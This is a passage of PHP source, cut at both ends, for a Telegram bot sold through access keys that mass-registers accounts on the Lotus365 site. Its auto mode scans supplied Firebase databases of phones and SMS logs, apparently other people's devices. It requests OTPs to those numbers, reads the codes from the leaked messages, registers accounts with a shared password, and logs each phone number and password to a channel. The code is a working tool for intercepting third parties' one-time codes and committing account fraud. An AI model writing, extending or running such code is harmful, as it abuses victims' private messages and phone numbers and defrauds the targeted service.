            $parts[] = ['✅', null];
            $parts[] = [" SUCCESS\n", null];
        } elseif ($st === 'sending_otp') $parts[] = [" ⏳ OTP SENDING...\n", null];
        elseif ($st === 'waiting_otp') $parts[] = [" ⏳ OTP SENT (WAITING...)\n", null];
        elseif ($st === 'otp_found') $parts[] = [" ✅ OTP FOUND!\n", null];
        elseif ($st === 'registering') $parts[] = [" 🔄 REGISTERING...\n", null];
        elseif ($st === 'failed') { $parts[] = ['❌', null]; $parts[] = [" " . ($d['error'] ?? 'FAILED') . "\n", null]; }
        else $parts[] = [" ⏳ PENDING\n", null];
    }
    $parts[] = ["\n━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📈', null];
    $parts[] = [" PROGRESS: $done/$total | PAGE: $pNum/$totalPages\n", null];
    $parts[] = ['🏁', null];
    $parts[] = [$cancelled ? " CANCELLED\n" : ($final ? " COMPLETE\n" : " RUNNING...\n"), null];
    return $parts;
}

function terminalKeyboard($pageIdx, $totalPages, $final = false) {
    $rows = [];
    if ($totalPages > 1) {
        $nav = [];
        if ($pageIdx > 0) $nav[] = ['text'=>math_font('PREV'),'callback_data'=>'term_page:' . ($pageIdx-1),'style'=>'primary'];
        if ($pageIdx < $totalPages-1) $nav[] = ['text'=>math_font('NEXT'),'callback_data'=>'term_page:' . ($pageIdx+1),'style'=>'primary'];
        if ($nav) $rows[] = $nav;
    }
    if (!$final) $rows[] = [['text'=>math_font('CANCEL'),'callback_data'=>'term_cancel','style'=>'danger']];
    return $rows ? ['inline_keyboard'=>$rows] : null;
}

function renderTerminal($uid, $final = false, $force = false) {
    static $last = 0.0;
    if (!$final && !$force && (microtime(true)-$last) < PROGRESS_INTERVAL) return;
    $last = microtime(true);
    $s = getTerminalState($uid); if (!$s || empty($s['msg_id'])) return;
    $pg = pickDisplayPage($s, $uid);
    $s['current_page'] = $pg; setTerminalState($uid, $s);
    $totalPages = count(computePages($s['total'] ?? 0));
    $parts = terminalParts($s, $pg, $final || !empty($s['completed']) || !empty($s['cancelled']));
    $kb = terminalKeyboard($pg, $totalPages, $final || !empty($s['completed']) || !empty($s['cancelled']));
    edit_premium($s['chat_id'], $s['msg_id'], $parts, $kb);
}

function logToChannel($text) {
    if (!LOG_CHAT) return;
    tg('sendMessage', ['chat_id'=>LOG_CHAT,'text'=>$text,'parse_mode'=>'HTML']);
}

function logAccount($phone, $userId, $uid) {
    if (!LOG_CHAT) return;
    $u = getUser($uid) ?: [];
    $name = htmlspecialchars($u['name'] ?? 'User', ENT_QUOTES, 'UTF-8');
    $uname = !empty($u['username']) ? '@' . htmlspecialchars($u['username'], ENT_QUOTES, 'UTF-8') : 'N/A';
    logToChannel("🎉 <b>LOTUS365 ACCOUNT CREATED</b>\n\n"
       . "📱 <b>PHONE:</b> <code>$phone</code>\n"
       . "🔑 <b>PASS:</b> <code>" . SITE_PASSWORD . "</code>\n"
       . "🆔 <b>USER ID:</b> <code>$userId</code>\n\n"
       . "👤 <b>NAME:</b> $name\n"
       . "🏷 <b>USERNAME:</b> $uname\n"
       . "🆔 <b>TELEGRAM ID:</b> <code>$uid</code>");
}

function saveFirebaseUrl($url) {
    $p = DATA_DIR . '/firebase.txt';
    $existing = file_exists($p) ? array_map('trim', file($p)) : [];
    if (in_array($url, $existing)) return false;
    file_put_contents($p, $url . "\n", FILE_APPEND|LOCK_EX);
    return true;
}

function spawnWorker($uid, $chat_id, $urls, $scan_msg_id = null) {
    $payload = json_encode([
        'uid'=>(int)$uid,'chat_id'=>(int)$chat_id,
        'urls'=>(array)$urls,'scan_msg_id'=>$scan_msg_id,'ts'=>time(),
    ], JSON_UNESCAPED_SLASHES);
    $token = hash_hmac('sha256', $payload, WORKER_SECRET);
    $worker = __DIR__ . '/worker.php';
    $dis = array_map('trim', explode(',', (string)ini_get('disable_functions')));

    if (function_exists('exec') && !in_array('exec', $dis)) {
        @exec('nohup php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &');
        return true;
    }
    if (function_exists('popen') && !in_array('popen', $dis)) {
        $h = @popen('php ' . escapeshellarg($worker) . ' ' . escapeshellarg(base64_encode($payload)) . ' ' . escapeshellarg($token) . ' > /dev/null 2>&1 &', 'r');
        if ($h) { @pclose($h); return true; }
    }
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $dir = rtrim(str_replace('\\','/', dirname($_SERVER['SCRIPT_NAME'] ?? '/bot.php')), '/');
    $wurl = $scheme . '://' . $host . $dir . '/worker.php';
    $ch = curl_init($wurl);
    curl_setopt_array($ch, [
        CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>$payload,
        CURLOPT_HTTPHEADER=>['Content-Type: application/json','X-Worker-Token: ' . $token,'Connection: close'],
        CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT_MS=>700,
        CURLOPT_CONNECTTIMEOUT_MS=>300, CURLOPT_SSL_VERIFYPEER=>false,
        CURLOPT_FORBID_REUSE=>true, CURLOPT_FRESH_CONNECT=>true,
    ]);
    $ok = @curl_exec($ch); $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch);
    return ($ok !== false && $code >= 200 && $code < 500);
}

function runAutoFlow($uid, $chat_id, $urls, $scan_msg_id = null) {
    clearUserManualPage($uid);

    $start_time = time();
    $all_devices = [];
    $failed_count = 0;
    $working_urls = [];
    $totalUrls = count($urls);
    $scannedCount = 0;
    $lastEdit = 0.0;

    foreach (array_chunk($urls, FB_SCAN_CONCURRENCY, true) as $batchUrls) {
        $st = getTerminalState($uid);
        if (!empty($st['cancelled'])) break;

        $batchRes = fastBatchScanFirebases($batchUrls, 2, FB_SCAN_CONCURRENCY);
        foreach ($batchUrls as $idx => $url) {
            $scannedCount++;
            $scan = $batchRes[$idx] ?? ['ok'=>false, 'devices'=>[]];
            if (!empty($scan['ok'])) {
                $working_urls[] = $url;
                saveFirebaseUrl($url);
                foreach ($scan['devices'] as $cid => $d) {
                    $d['base_url'] = $url;
                    $all_devices[$url . ':::' . $cid] = $d;
                }
            } else {
                $failed_count++;
            }
        }

        $nowF = microtime(true);
        if ($scan_msg_id && (($nowF - $lastEdit) >= 1.2 || $scannedCount >= $totalUrls)) {
            $lastEdit = $nowF;
            $elapsedScan = max(0, time() - $start_time);
            $lastUrl = end($batchUrls);
            $host = parse_url((string)$lastUrl, PHP_URL_HOST) ?: (string)$lastUrl;
            edit_premium($chat_id, $scan_msg_id, [
                ['🔍', null], [" FAST SCANNING FIREBASE...\n\n", null],
                ["📌 URL: {$scannedCount}/{$totalUrls} | ⏱ {$elapsedScan}s\n\n", null],
                ["🔗 BATCH: <code>" . substr($host, 0, 28) . "</code>\n", null],
                ["🟢 WORKING: " . count($working_urls) . " | 🔴 FAILED: {$failed_count}", null]
            ]);
        }
    }

    if ($scan_msg_id) {
        edit_premium($chat_id, $scan_msg_id, [
            ['✅', null], [" SCAN COMPLETE!\n\n", null],
            ["🟢 WORKING: " . count($working_urls) . "\n", null],
            ["🔴 FAILED: {$failed_count}\n\n", null],
            ["⏳ STARTING OTP & REGISTRATION...", null]
        ]);
        sleep(1);
        tg('deleteMessage', ['chat_id'=>$chat_id,'message_id'=>$scan_msg_id]);
    }

    if (empty($all_devices)) {
        send_premium($chat_id, [['❌', null], [' NO VALID DEVICES FOUND IN ANY FIREBASE', null]], mainMenuKeyboard($uid));
        return;
    }

    $devices = [];
    $alreadyDone = 0;
    foreach ($all_devices as $cid => $d) {
        if (!isPhoneRegistered($uid, $d['phone'])) $devices[$cid] = $d;
        else $alreadyDone++;
    }

    $total = count($devices);
    if ($total === 0) {
        if ($alreadyDone > 0) send_premium($chat_id, [['⭐', null], [" NO NEW DEVICES FOUND (ALL ALREADY REGISTERED)", null]], mainMenuKeyboard($uid));
        else send_premium($chat_id, [['❌', null], [" NO VALID PHONE NUMBERS FOUND", null]], mainMenuKeyboard($uid));
        return;
    }

    if (MAX_DEVICES_PER_RUN > 0) {
        $devices = array_slice($devices, 0, MAX_DEVICES_PER_RUN, true);
    }
    $list = [];
    foreach ($devices as $cid => $d) {
        $cleanCid = strpos((string)$cid, ':::') !== false ? substr((string)$cid, strpos((string)$cid, ':::') + 3) : (string)$cid;
        $list[] = ['cid'=>$cleanCid,'phone'=>$d['phone'],'name'=>$d['name']??$cleanCid,'base_url'=>$d['base_url'],
            'status'=>'pending','userid'=>'','error'=>'','otp'=>'','baseline'=>[]];
    }
    $totalPages = count(computePages(count($list)));

    $term = [
        'chat_id'=>$chat_id,'uid'=>$uid,'url'=>implode(',', array_slice($working_urls, 0, 50)),
        'total'=>count($list),'current_page'=>0,
        'done'=>0,'success'=>0,'failed'=>0,'devices'=>$list,'msg_id'=>null,
        'cancelled'=>false,'completed'=>false,'started_at'=>time(),
    ];
    $res = send_premium($chat_id, terminalParts($term, 0, false), terminalKeyboard(0, $totalPages, false));
    if (!empty($res['ok'])) $term['msg_id'] = $res['result']['message_id'];
    setTerminalState($uid, $term);

    $baselineUrls = [];
    foreach ($term['devices'] as $i => $dev) {
        $msgUrlBase = rtrim($dev['base_url'], '/') . '/messages/';
        $baselineUrls[$i] = $msgUrlBase . rawurlencode($dev['cid']) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
    }
    $baselineRaw = multiGetJson($baselineUrls, 5);
    foreach ($baselineRaw as $i => $msgs) {
        if (is_array($msgs)) $term['devices'][$i]['baseline'] = array_map('strval', array_keys($msgs));
    }
    setTerminalState($uid, $term);

    $pending_otp = [];
    foreach ($term['devices'] as $i => $dev) {
        $term['devices'][$i]['status'] = 'sending_otp';
        $pending_otp[$i] = 1;
    }
    setTerminalState($uid, $term);
    renderTerminal($uid, false, true);

    for ($try = 1; $try <= 5; $try++) {
        if (empty($pending_otp)) break;
        $still_pending = [];
        foreach (array_chunk($pending_otp, BATCH_SIZE, true) as $chunk) {
            $mh = curl_multi_init(); $hs = [];
            foreach ($chunk as $i => $attempt) {
                $hs[$i] = buildSendOtpHandle($term['devices'][$i]['phone']);
                curl_multi_add_handle($mh, $hs[$i]);
            }

            $active = null;
            do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);

            foreach ($hs as $i => $ch) {
                $r = curl_multi_getcontent($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_multi_remove_handle($mh, $ch); curl_close($ch);
                $j = json_decode($r, true);
                $attempt = $chunk[$i];

                if ($code == 200 && !empty($j['success'])) {
                    $term['devices'][$i]['status'] = 'waiting_otp';
                } else {
                    if ($try < 5) $still_pending[$i] = $attempt + 1;
                    else {
                        $term['devices'][$i]['status'] = 'failed';
                        $term['devices'][$i]['error'] = 'OTP SEND FAIL';
                        $term['failed']++; $term['done']++;
                    }
                }
            }
            curl_multi_close($mh);
        }
        $pending_otp = $still_pending;
        setTerminalState($uid, $term);
        renderTerminal($uid, false, true);
    }

    $waitStart = time();
    while ((time() - $waitStart) < 30) {
        $term = getTerminalState($uid);
        if (!empty($term['cancelled'])) break;

        $check_devices = [];
        foreach ($term['devices'] as $i => $dev) {
            if ($dev['status'] === 'waiting_otp') {
                $msgUrlBase = rtrim($dev['base_url'], '/') . '/messages/';
                $check_devices[$i] = $msgUrlBase . rawurlencode($dev['cid']) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
            }
        }

        $newly_found = [];
        if (!empty($check_devices)) {
            $msgs_data = multiGetJson($check_devices, 4);
            foreach ($msgs_data as $i => $msgs) {
                if (is_array($msgs)) {
                    foreach ($msgs as $mid => $msg) {
                        if (!is_array($msg)) continue;
                        $body = $msg['body'] ?? $msg['text'] ?? $msg['message'] ?? $msg['msg'] ?? $msg['SMS'] ?? '';
                        if ($body === '') continue;
                        if (in_array((string)$mid, $term['devices'][$i]['baseline'])) continue;
                        $otp = extractLotusOtp((string)$body);
                        if ($otp) {
                            $term['devices'][$i]['otp'] = $otp;
                            $term['devices'][$i]['status'] = 'registering';
                            $newly_found[$i] = $otp;
                            break;
                        }
                    }
                }
            }
        }

        if (!empty($newly_found)) {
            foreach (array_chunk($newly_found, BATCH_SIZE, true) as $chunk) {
                $mh = curl_multi_init(); $hs = [];
                foreach ($chunk as $i => $otp) {
                    $hs[$i] = buildRegisterHandle($term['devices'][$i]['phone'], $otp);
                    curl_multi_add_handle($mh, $hs[$i]);
                }

                $active = null;
                do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);

                foreach ($hs as $i => $ch) {
                    $r = curl_multi_getcontent($ch);
                    curl_multi_remove_handle($mh, $ch); curl_close($ch);
                    $j = json_decode($r, true);
                    $userId = $j['data']['userid'] ?? null;

                    if (!empty($userId)) {
                        $term['devices'][$i]['status'] = 'completed';
                        $term['devices'][$i]['userid'] = $userId;
                        $term['success']++;
                        saveAccount($uid, $term['devices'][$i]['phone'], $userId);
                        logAccount($term['devices'][$i]['phone'], $userId, $uid);
                    } else {
                        $term['devices'][$i]['status'] = 'failed';
                        $term['devices'][$i]['error'] = 'REGISTER FAIL';
                        $term['failed']++;
                    }
                    $term['done']++;
                }
                curl_multi_close($mh);
            }
            setTerminalState($uid, $term);
            renderTerminal($uid, false, true);
        }

        $all_done = true;
        foreach ($term['devices'] as $dev) {
            if ($dev['status'] === 'waiting_otp') { $all_done = false; break; }
        }
        if ($all_done) break;

        renderTerminal($uid, false, true);
        usleep(500000);
    }

    $term = getTerminalState($uid);
    foreach ($term['devices'] as $i => $dev) {
        if ($dev['status'] === 'waiting_otp') {
            $term['devices'][$i]['status'] = 'failed';
            $term['devices'][$i]['error'] = 'OTP TIMEOUT (30s)';
            $term['failed']++; $term['done']++;
        }
    }

    $term['completed'] = true;
    setTerminalState($uid, $term);
    renderTerminal($uid, true, true);

    $s = $term['success'] ?? 0; $f = $term['failed'] ?? 0; $t = $term['total'] ?? 0;

    if ($s > 0) {
        $successful_phones = [];
        foreach ($term['devices'] as $d) {
            if ($d['status'] === 'completed') $successful_phones[] = $d['phone'];
        }
        if (!empty($successful_phones)) {
            $tmp_file = DATA_DIR . '/success_' . $uid . '_' . time() . '.txt';
            file_put_contents($tmp_file, implode("\n", $successful_phones) . "\n");
            sendDocument($chat_id, $tmp_file, "✅ <b>Successfully Registered Accounts</b> (" . count($successful_phones) . ")\n\nOnly the successes from this run are included here.");
            @unlink($tmp_file);
        }
    }

    send_premium($chat_id, [
        ['⭐', null], [$s > 0 ? " AUTO REGISTER COMPLETE\n" : " AUTO REGISTER FAILED\n", null],
        ["━━━━━━━━━━━━━━━━━━\n", null],
        ['📊', null], [" TOTAL CHECKED: $t\n", null],
        ['✅', null], [" SUCCESS: $s\n", null],
        ['❌', null], [" FAILED: $f\n", null],
        ['💼', null], [" TOTAL ACCOUNTS: " . getAccountCount($uid) . "\n\n", null],
        ['👇', null], [" USE 'MY ACCOUNTS' TO DOWNLOAD ALL", null],
    ], mainMenuKeyboard($uid));
}

if (!defined('BOT_LIB_ONLY')) {
    ensureSideMenuCommands();
    $input = file_get_contents('php://input');
    $update = json_decode($input, true);
    if (!$update) exit;
    try {
        if (isset($update['chat_member'])) handleChatMember($update['chat_member']);
        elseif (isset($update['callback_query'])) handleCallback($update['callback_query']);
        elseif (isset($update['message'])) handleMessage($update['message']);
    } catch (Throwable $e) { error_log('Bot err: ' . $e->getMessage()); }
}

function handleChatMember($cm) {
    $uid = $cm['new_chat_member']['user']['id'] ?? null;
    $st = $cm['new_chat_member']['status'] ?? '';
    if (!$uid) return;
    if (in_array($st, ['left','kicked'])) { setVerified($uid, false); clearState($uid); }
}

function handleCallback($cb) {
    $uid = $cb['from']['id'];
    $name = trim(($cb['from']['first_name'] ?? '') . ' ' . ($cb['from']['last_name'] ?? '')) ?: 'User';
    $username = $cb['from']['username'] ?? '';
    $data = $cb['data'] ?? '';
    $cb_id = $cb['id'];
    $chat_id = $cb['message']['chat']['id'];
    ensureUser($uid, $name, $username);

    if ($data === 'check_membership') {
        if (checkForceJoin($uid, true)) {
            tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'✅ Verified!','show_alert'=>false]);
            @tg('deleteMessage', ['chat_id'=>$chat_id,'message_id'=>$cb['message']['message_id']]);
            sendWelcome($chat_id, $uid, $name);
        } else {
            tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'⚠️ Channel join nahi kiya!','show_alert'=>false]);
        }
        return;
    }

    if (strpos($data, 'term_page:') === 0) {
        $target = (int)substr($data, 10);
        $s = getTerminalState($uid);
        if ($s) {
            $totalPages = count(computePages($s['total'] ?? 0));
            $target = max(0, min($totalPages-1, $target));
            setUserManualPage($uid, $target);
            $parts = terminalParts($s, $target, !empty($s['completed']) || !empty($s['cancelled']));
            $kb = terminalKeyboard($target, $totalPages, !empty($s['completed']) || !empty($s['cancelled']));
            edit_premium($chat_id, $cb['message']['message_id'], $parts, $kb);
        }
        tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'📄 Page ' . ($target+1),'show_alert'=>false]);
        return;
    }

    if ($data === 'term_cancel') {
        tg('answerCallbackQuery', ['callback_query_id'=>$cb_id,'text'=>'🛑 Stopping...','show_alert'=>false]);
        $s = getTerminalState($uid);
        if ($s) { $s['cancelled'] = true; $s['completed'] = true; setTerminalState($uid, $s); renderTerminal($uid, true, true); }
        clearState($uid);
        send_premium($chat_id, [['❌', null], [' CANCELLED', null]], mainMenuKeyboard($uid));
        return;
    }

    tg('answerCallbackQuery', ['callback_query_id'=>$cb_id]);
}

function handleMessage($msg) {
    $uid = $msg['from']['id'];
    $name = trim(($msg['from']['first_name'] ?? '') . ' ' . ($msg['from']['last_name'] ?? '')) ?: 'User';
    $username = $msg['from']['username'] ?? '';
    $chat_id = $msg['chat']['id'];
    $text = trim($msg['text'] ?? '');
    $doc = $msg['document'] ?? null;

    if ($text === '' && empty($doc['file_id'])) return;

    if ($text !== '' && preg_match('/^\/start/', $text)) { handleStart($uid, $name, $username, $chat_id); return; }

    ensureUser($uid, $name, $username);

    $settings = getSettings();
    if (!empty($settings['maintenance']) && !isAdmin($uid)) {
        send_premium($chat_id, [['🛠️', null], [' MAINTENANCE MODE', null]]);
        return;
    }

    $isMenuAction = in_array($text, [
        math_font('CREATE ACCOUNT'), 'CREATE ACCOUNT',
        math_font('AUTO MODE'), 'AUTO MODE',
        math_font('MY ACCOUNTS'), 'MY ACCOUNTS',
        math_font('ENTER KEY'), 'ENTER KEY',
        math_font('GEN KEY'), 'GEN KEY',
        math_font('LIST KEYS'), 'LIST KEYS',
        math_font('DEL KEY'), 'DEL KEY',
        math_font('CANCEL'), 'CANCEL',
        '/cancel', '/create', '/auto', '/accounts', '/key', '/genkey', '/keys', '/delkey'
    ]);
    if (!checkForceJoin($uid, $isMenuAction)) {
        clearState($uid); sendJoinPrompt($chat_id); return;
    }

    if ($text === '/cancel' || mb_strtoupper($text, 'UTF-8') === 'CANCEL' || $text === math_font('CANCEL')) {
        $s = getTerminalState($uid);
        if ($s && empty($s['completed'])) { $s['cancelled'] = true; $s['completed'] = true; setTerminalState($uid, $s); renderTerminal($uid, true, true); }
        clearState($uid);
        send_premium($chat_id, [['❌', null], [' CANCELLED.', null]], mainMenuKeyboard($uid));
        return;
    }

    $state = getState($uid);
    if ($state) {
        $step = $state['step'] ?? '';
        if ($step === 'awaiting_fb_url' && !empty($doc['file_id'])) {
            handleFbFileInput($uid, $chat_id, $doc['file_id']); return;
        }
        if ($text !== '') {
            if ($step === 'awaiting_phone')     { handlePhoneInput($uid, $chat_id, $text); return; }
            if ($step === 'awaiting_otp')       { handleOtpInput($uid, $chat_id, $text); return; }
            if ($step === 'awaiting_fb_url')    { handleFbUrlInput($uid, $chat_id, $text); return; }
            if ($step === 'awaiting_user_key')  { handleUserKeyInput($uid, $chat_id, $text); return; }
            if ($step === 'awaiting_gen_key')   { handleAdminGenKeyInput($uid, $chat_id, $text); return; }
            if ($step === 'awaiting_del_key')   { handleAdminDelKeyInput($uid, $chat_id, $text); return; }
        }
    }

    if ($text === '') return;

    if (in_array($text, ['/key', 'ENTER KEY', math_font('ENTER KEY')])) {
        handleKeyPrompt($uid, $chat_id); return;
    }

    if (in_array($text, ['/genkey', 'GEN KEY', math_font('GEN KEY')])) {
        if (!isAdmin($uid)) { send_premium($chat_id, [['❌', null], [' ADMIN ONLY.', null]], mainMenuKeyboard($uid)); return; }
        handleAdminGenKeyStart($uid, $chat_id); return;
    }

    if (in_array($text, ['/keys', 'LIST KEYS', math_font('LIST KEYS')])) {
        if (!isAdmin($uid)) { send_premium($chat_id, [['❌', null], [' ADMIN ONLY.', null]], mainMenuKeyboard($uid)); return; }
        handleAdminListKeys($uid, $chat_id); return;
    }

    if (in_array($text, ['/delkey', 'DEL KEY', math_font('DEL KEY')])) {
        if (!isAdmin($uid)) { send_premium($chat_id, [['❌', null], [' ADMIN ONLY.', null]], mainMenuKeyboard($uid)); return; }
        handleAdminDelKeyStart($uid, $chat_id); return;
    }

    if (!hasValidKey($uid)) {
        sendKeyRequiredPrompt($chat_id, $uid);
        return;
    }

    if (in_array($text, ['/accounts', 'MY ACCOUNTS', math_font('MY ACCOUNTS')])) {
        clearState($uid); handleMyAccounts($uid, $chat_id); return;
    }
    if (in_array($text, ['/create', 'CREATE ACCOUNT', math_font('CREATE ACCOUNT')])) {
        handleCreateStart($uid, $chat_id); return;
    }
    if (in_array($text, ['/auto', 'AUTO MODE', math_font('AUTO MODE')])) {
        handleAutoStart($uid, $chat_id); return;
    }

    send_premium($chat_id, [['👇', null], [' USE THE BUTTONS BELOW.', null]], mainMenuKeyboard($uid));
}

function handleStart($uid, $name, $username, $chat_id) {
    ensureUser($uid, $name, $username);
    if (!checkForceJoin($uid, true)) { sendJoinPrompt($chat_id); return; }
    sendWelcome($chat_id, $uid, $name);
}

function sendWelcome($chat_id, $uid, $name) {
    clearState($uid);
    $ac = getAccountCount($uid);
    $keyInfo = getUserActiveKey($uid);
    $keyText = $keyInfo
        ? ($keyInfo['key'] . " (" . $keyInfo['remaining'] . " LEFT)")
        : "NO ACTIVE KEY";

    $parts = [
        ['👋', null], [' WELCOME IMRAN9719 ⚡\n\n', null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['🤖', null], [' LOTUS365 AUTO REGISTER (UNLIMITED)' . "\n", null],
        ['🔑', null], [" KEY STATUS: $keyText\n", null],
        ['💼', null], [" YOUR ACCOUNTS: $ac\n", null],
        ['🔐', null], [" PASSWORD: ", null], [SITE_PASSWORD, null, 'code'],
        ["\n\n━━━━━━━━━━━━━━━━━━\n\n", null],
        ['👇', null], [' TAP BELOW TO START ', null],
    ];
    send_premium($chat_id, $parts, mainMenuKeyboard($uid), false);
}

function handleKeyPrompt($uid, $chat_id) {
    setState($uid, ['step' => 'awaiting_user_key']);
    send_premium($chat_id, [
        ['🔑', null], [" ENTER YOUR ACCESS KEY\n\n", null],
        [" APNI KEY YAHAN PASTE KAREIN (TIMER KEY ACTIVATE HONE PAR SHURU HOGA).", null],
    ], cancelKeyboard());
}

function handleUserKeyInput($uid, $chat_id, $text) {
    $res = redeemAccessKey($uid, $text);
    clearState($uid);
    if (empty($res['ok'])) {
        send_premium($chat_id, [['❌', null], [" " . $res['msg'], null]], mainMenuKeyboard($uid));
        return;
    }
    $e = $res['entry'];
    $expStr = ($e['expires_at'] !== null) ? date('Y-m-d H:i:s', (int)$e['expires_at']) : 'NEVER (UNLIMITED)';
    send_premium($chat_id, [
        ['✅', null], [" KEY ACTIVATED!\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n", null],
        ['🔑', null], [" KEY: ", null], [$e['key'], null, 'code'], ["\n", null],
        ['⏳', null], [" VALIDITY: " . $e['duration_label'] . "\n", null],
        ['🕒', null], [" EXPIRES AT: $expStr\n", null],
        ['⚡', null], [" REMAINING: " . formatRemainingTime($e['expires_at']) . "\n", null],
        ["━━━━━━━━━━━━━━━━━━", null],
    ], mainMenuKeyboard($uid));
}

function handleAdminGenKeyStart($uid, $chat_id) {
    setState($uid, ['step' => 'awaiting_gen_key']);
    send_premium($chat_id, [
        ['🔑', null], [" GENERATE CUSTOM KEY WITH TIME\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        [" FORMAT: <CUSTOM_KEY> <TIME>\n\n", null],
        [" EXAMPLES:\n", null],
        ["• VIP-IMRAN 24h\n", null],
        ["• TEST-USER 30m\n", null],
        ["• WEEKLY-PASS 7d\n", null],
        ["• AUTO 1h   (random key)\n", null],
        ["• GOLD-KEY unlimited\n\n", null],
        [" TIME UNITS: m (min), h (hour), d (day), w (week), unlimited", null],
    ], cancelKeyboard());
}

function handleAdminGenKeyInput($uid, $chat_id, $text) {
    $parts = preg_split('/\s+/', trim($text));
    if (count($parts) < 2) {
        send_premium($chat_id, [['❌', null], [" FORMAT GALAT HAI. EXAMPLE: VIP-USER 24h YA AUTO 1h", null]], cancelKeyboard());
        return;
    }
    $durationRaw = array_pop($parts);
    $customKey = implode('-', $parts);

    $created = createAccessKey($customKey, $durationRaw);
    clearState($uid);

    if (empty($created['ok'])) {
        send_premium($chat_id, [['❌', null], [" " . $created['error'], null]], mainMenuKeyboard($uid));
        return;
    }

    $e = $created['entry'];
    send_premium($chat_id, [
        ['✅', null], [" NEW KEY GENERATED!\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n", null],
        ['🔑', null], [" KEY: ", null], [$e['key'], null, 'code'], ["\n", null],
        ['⏳', null], [" TIME LIMIT: " . $e['duration_label'] . "\n", null],
        [" (TIMER USER KE ACTIVATE KARNE PAR SHURU HOGA)\n", null],
        ["━━━━━━━━━━━━━━━━━━", null],
    ], mainMenuKeyboard($uid));
}

function handleAdminListKeys($uid, $chat_id) {
    $db = getKeysDb();
    $now = time();
    $clean = [];
    foreach ($db as $code => $e) {
        if ($e['expires_at'] !== null && $now >= (int)$e['expires_at']) continue;
        $clean[$code] = $e;
    }
    saveKeysDb($clean);

    if (empty($clean)) {
        send_premium($chat_id, [['ℹ️', null], [" KOI ACTIVE KEY NAHI HAI.", null]], mainMenuKeyboard($uid));
        return;
    }

    $lines = [];
    foreach ($clean as $code => $e) {
        $status = $e['assigned_to']
            ? ("USED BY " . $e['assigned_to'] . " | LEFT: " . formatRemainingTime($e['expires_at']))
            : ("UNUSED | TIME: " . $e['duration_label']);
        $lines[] = "• " . $code . " → " . $status;
    }
    send_premium($chat_id, [
        ['📋', null], [" ACTIVE KEYS (" . count($clean) . ")\n\n", null],
        [implode("\n", array_slice($lines, 0, 25)), null],
    ], mainMenuKeyboard($uid));
}

function handleAdminDelKeyStart($uid, $chat_id) {
    setState($uid, ['step' => 'awaiting_del_key']);
    send_premium($chat_id, [
        ['🗑️', null], [" DELETE ACCESS KEY\n\n", null],
        [" JIS KEY KO DELETE KARNA HAI USKA NAAM BHEJEIN.", null],
    ], cancelKeyboard());
}

function handleAdminDelKeyInput($uid, $chat_id, $text) {
    $code = strtoupper(trim($text));
    $ok = deleteAccessKey($code);
    clearState($uid);
    if ($ok) {
        send_premium($chat_id, [['✅', null], [" KEY DELETED: ", null], [$code, null, 'code']], mainMenuKeyboard($uid));
    } else {
        send_premium($chat_id, [['❌', null], [" KEY NOT FOUND: ", null], [$code, null, 'code']], mainMenuKeyboard($uid));
    }
}

function handleMyAccounts($uid, $chat_id) {
    $count = getAccountCount($uid);
    if ($count === 0) {
        send_premium($chat_id, [
            ['❌', null], [" NO ACCOUNTS YET\n\n", null],
            ['🚀', null], [" CREATE YOUR FIRST ACCOUNT", null],
        ], mainMenuKeyboard($uid));
        return;
    }
    $f = accountsFile($uid);
    sendDocument($chat_id, $f, "📁 <b>Your Lotus365 Accounts ($count)</b>\n\nFormat: <b>Only Phone Numbers</b>\nPassword for all: <code>" . SITE_PASSWORD . "</code>");
}

function handleCreateStart($uid, $chat_id) {
    setState($uid, ['step'=>'awaiting_phone']);
    send_premium($chat_id, [
        ['🚀', null], [" CREATE LOTUS365 ACCOUNT\n\n", null],
        ["━━━━━━━━━━━━━━━━━━\n\n", null],
        ['📱', null], [" SEND YOUR 10-DIGIT PHONE NUMBER:\n\n", null],
        ['⭐', null], [" EXAMPLE: ", null], ['9876543210', null, 'code'],
        ["\n\n🔑 PASSWORD: ", null], [SITE_PASSWORD, null, 'code'],
    ], cancelKeyboard());
}

function handlePhoneInput($uid, $chat_id, $phone) {
    $phone = preg_replace('/\D/', '', $phone);
    if (!preg_match('/^[6-9]\d{9}$/', $phone)) {
        send_premium($chat_id, [['❌', null], [' INVALID NUMBER. SEND 10 DIGIT:', null]], cancelKeyboard());
        return;
    }
    if (isPhoneRegistered($uid, $phone)) {
        send_premium($chat_id, [
            ['⚠️', null], [" ALREADY REGISTERED\n\n", null],
            [" THIS NUMBER IS ALREADY IN YOUR ACCOUNTS FILE.", null]
        ], mainMenuKeyboard($uid));
        clearState($uid);
        return;
    }

    send_premium($chat_id, [['⏳', null], [" SENDING OTP...", null]]);

    $ch = buildSendOtpHandle($phone);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    $j = json_decode($r, true);

    if ($code != 200 || empty($j['success'])) {
        send_premium($chat_id, [['❌', null], [' OTP SEND FAILED. TRY AGAIN.', null]], mainMenuKeyboard($uid));
        clearState($uid);
        return;
    }
    setState($uid, ['step'=>'awaiting_otp', 'phone'=>$phone]);
    send_premium($chat_id, [
        ['✅', null], [" OTP SENT TO ", null], ['+91' . $phone, null, 'code'],
